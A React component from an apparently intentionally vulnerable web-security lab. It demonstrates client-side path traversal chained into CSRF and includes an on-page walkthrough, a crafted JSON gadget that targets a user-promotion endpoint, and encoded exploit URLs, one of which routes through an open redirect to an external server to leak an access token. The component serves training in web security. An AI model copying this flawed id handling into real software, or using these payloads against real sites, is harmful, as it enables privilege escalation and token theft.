import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { toast } from 'react-toastify';

import { client } from '../client';

import { Accordion, Container } from 'react-bootstrap';

import NoteSingleView from './NoteSingleView';

const VulnerableNotesAutoGet2PostSink = () => {
  const [note, setNote] = useState(null);
  const { id } = useParams();

  // Fetch note by ID from path param and send "seen note"
  useEffect(() => {
    if (id) {
      client.fetchNoteById(id)
        .then(data => {
          client.seenNote(data._id);
          setNote(data);
        })
        .catch(error => {
          toast.error(`${error}`);
        });

    }
  }, [id]);


  return (
    <Container className="mt-5">
      <Accordion defaultActiveKey="0">
        <Accordion.Item eventKey="0" >
          <Accordion.Header>Explanation</Accordion.Header>
          <Accordion.Body>
            This page is vulnerable to a CSPT2CSRF with a GET sink. The application reads the :id from the URL path and fetches the note from the server.
            Based on the returned data, the note will be displayed and the page will send a POST request to the server (/api/v1/note/:id/seen).<br />
            This GET CSPT2CSRF can be turned into a CSRF with a POST sink and the access token can also be leaked.
          </Accordion.Body>
        </Accordion.Item>
        <Accordion.Item eventKey="1">
          <Accordion.Header>Solution</Accordion.Header>
          <Accordion.Body>
            This vulnerability exist because an attacker can create a malicious URL that automatically sends a POST request to the vulnerable page when visited.<br />
            On this page, an attacker can URL encode the id path param (/vulnerable/note_auto_get_to_post_sink/:id). This URL matches the React route, and the ID will be read. However, the page expects a valid Note JSON object. Indeed id used in /api/v1/note/:id/seen comes from the JSON Object.<br />
            <br />
            The attacker must exploit the CSPT2CSRF with a GET sink to read a gadget containing a crafted JSON Object. This object, itself must contain, another CSPT to the final POST endpoint.<br />

            Different gadgets are available:<br />
            <ul>
              <li>Open redirects can be used to hit an external server containing the gadget. It can also under certain circumstances leak sensitive data. This example will leak the access token.</li>
              <li>Any endpoint that returns control data such as /api/gadget/files/:id/raw </li>
            </ul>
            In this POC, the attacker uploaded the following gadget using the file feature:<br />
            <code>&#x7b;"_id":"../../../../api/sink/promote/lax_in_extra_param_promote/66fc8c17d29c4a98a44a4a87?","title":"I\'m a File not a Note","description":"We will use this gadget to return a malicious id"&#x7d;</code><br />
            If the attacker coerces a logged-in admin to visit the URL, the following POCs will call /api/sink/promote/lax_in_extra_param_promote/:id to promote a user.<br />
            <a href="/vulnerable/note_auto_get_to_post_sink/..%2F..%2Fgadget%2Ffiles%2F66fc8d071bcf0dd223467bba%2Fraw%3f">/vulnerable/note_auto_post_sink/..%2F..%2Fgadget%2Ffiles%2F66fc8d071bcf0dd223467bba%2Fraw%3f</a><br />
            <a href='/vulnerable/note_auto_get_to_post_sink/..%2F..%2Fgadget%2Fopen_redirect%3Furl=<YOUR_EXTERNAL_SERVER_RETURNING_JSON_PAYLOAD>%61'>/vulnerable/note_auto_post_sink/..%2F..%2Fgadget%2Fopen_redirect%3Furl=%3CYOUR_EXTERNAL_SERVER_RETURNING_JSON_PAYLOAD%3E%61</a>
          </Accordion.Body>
        </Accordion.Item>
      </Accordion>
      <br />

      <NoteSingleView note={note} setNote={setNote} />
    </Container>
  );
};

export default VulnerableNotesAutoGet2PostSink;